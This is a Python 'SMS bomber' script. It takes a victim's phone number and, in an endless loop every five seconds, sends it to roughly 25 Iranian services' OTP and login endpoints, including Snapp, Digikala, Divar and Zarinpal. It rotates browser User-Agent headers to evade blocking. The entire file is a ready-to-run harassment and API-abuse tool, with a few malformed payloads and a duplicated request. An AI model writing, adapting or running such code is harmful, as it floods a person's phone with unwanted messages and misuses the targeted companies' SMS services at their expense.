# -sms-bomber
import json
import requests
import random
import time

number = input("Inter your phone number (without 0) : ")
url_divar= "https://api.divar.ir/v5/auth/authenticate"
json_divar= {"phone":number}

url_ofchanel = "https://api.offch.com/followed_shops"
json_ofchanel = {"shop":number}
url_footbal360 = "https://football360.ir/api/auth/verify-phone/"
json_footbal360 = {"phone_number": number}

url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp= {"cellphone":"+98" + number}

url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
json_sf= {"cellphone":"0" + number}

url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sh= {"username":"0" + number}

url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba= {"phoneNumber":"+98" + number}

url_cinma= "https://cinematicket.org/api/v1/users/signup"
json_cinma= {"phone_number":"98" + number}

url_digikala= "https://api.digikala.com/v1/user/authenticate/"
json_digikala= {"backUrl":"/","username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

url_telewebion= "https://auth.telewebion.com/user/authenticate"
json_telewebion= {"field":"+98","type":"mobile" + number}

url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_sb= {"phoneNumber":"0" + number}

url_tpsi= "https://api.tapsi.cab/api/v2/user"
json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}

url_tim = "https://api.timcheh.com/auth/otp/send"
json_tim = {"mobile":"0"+number}

url_dr = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
json_dr = {"mobile":number}

url_tript = "https://uiapi2.saapa.ir/api/otp/sendCode"
json_tript = {"mobile": "0"+number}

url_sibapp = "https://api.sibche.com/profile/sendCode"
json_sibapp = {"mobile": "0"+number}

url_banimod = "https://mobapi.banimode.com/api/v2/auth/request"
json_banimod = {"phone":"0"+number}

url_bime = "https://api.bimebama.com/user/send_sms"
json_bime = {"mobile": "0"+number}

url_tor = "https://www.eligasht.com/Authentication/register"
json_tor = {"username": "0"+number}

url_zarinpal = "https://next.zarinpal.com/api/oauth/initialize"
json_zarinpal = {"username": "0"+number}

url_beroozmart = "https://api.beroozmart.com/api/pub/account/send-otp"
json_beroozmart ={"username": "98"+number}

url_korosh = "https://www.okcs.com/users/mobilelogin"
json_korosh = {"mobile":number}

url_gap = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}"
json_gap = {"cellphone":number}

heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]


while True:
    random_head = random.choice(heads)
    req = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req)
    req1 = requests.post(url= url_snapp,json=json_snapp,headers=random_head)
    print(req1)
    req2 = requests.post(url= url_sf,json=json_sf,headers=random_head)
    print(req2)
    req3 = requests.post(url= url_sh,json=json_sh,headers=random_head)
    print(req3)
    req4 = requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
    print(req4)
    req5 = requests.post(url= url_cinma,json=json_cinma,headers=random_head)
    print(req5)
    req6 = requests.post(url= url_digikala,json=json_digikala,headers=random_head)
    print(req6)
    req7 = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print(req7)
    req8 = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print(req8)
    req9 = requests.post(url= url_aparat,json=json_aparat,headers=random_head)
    print(req9)
    req10 = requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
    print(req10)
    req11 = requests.post(url= url_sb,json=json_sb,headers=random_head)
    print(req11)
    req12 = requests.post(url= url_tim,json=json_tim,headers=random_head)
    print(req12)
    req13 = requests.post(url= url_dr,json=json_dr,headers=random_head)
    print(req13)
    req14 = requests.post(url= url_footbal360,json=json_footbal360,headers=random_head)
    print(req14)
    req15 = requests.post(url= url_ofchanel,json=json_ofchanel,headers=random_head)
    print(req15)
    req16 = requests.post(url= url_tript,json=json_tript,headers=random_head)
    print(req16)
    req17 = requests.post(url= url_sibapp,json=json_sibapp,headers=random_head)
    print(req17)
    req18 = requests.post(url= url_banimod,json=json_banimod,headers=random_head)
    print(req18)
    req19 = requests.post(url= url_bime,json=json_bime,headers=random_head)
    print(req19)
    req20 = requests.post(url= url_tor,json=json_tor,headers=random_head)
    print(req20)
    req21 = requests.post(url= url_zarinpal,json=json_zarinpal,headers=random_head)
    print(req21)
    req22 = requests.post(url= url_beroozmart,json=json_beroozmart,headers=random_head)
    print(req22)
    req23 = requests.post(url= url_korosh,json=json_korosh,headers=random_head)
    print(req23)
    req24 = requests.post(url= url_korosh,json=json_korosh,headers=random_head)
    print(req24)
    req25 = requests.post(url= url_gap,json=json_gap,headers=random_head)
    print(req25)
    time.sleep(5)
